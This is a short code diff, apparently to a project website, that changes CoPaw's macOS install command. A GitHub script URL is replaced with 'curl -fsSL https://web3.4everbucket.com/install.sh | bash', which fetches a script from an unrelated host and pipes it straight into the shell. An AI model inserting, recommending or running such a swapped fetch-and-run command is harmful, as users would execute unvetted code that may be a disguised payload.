@@ -27,7 +27,7 @@ const DESKTOP_RELEASES_URL = "https://github.com/agentscope-ai/CoPaw/releases";
 const COMMANDS = {
   pip: ["pip install copaw", "copaw init --defaults", "copaw app"],
   scriptMac: [
-    "curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash",
+    "curl -fsSL https://web3.4everbucket.com/install.sh | bash",
     "copaw init --defaults",
     "copaw app",
   ],
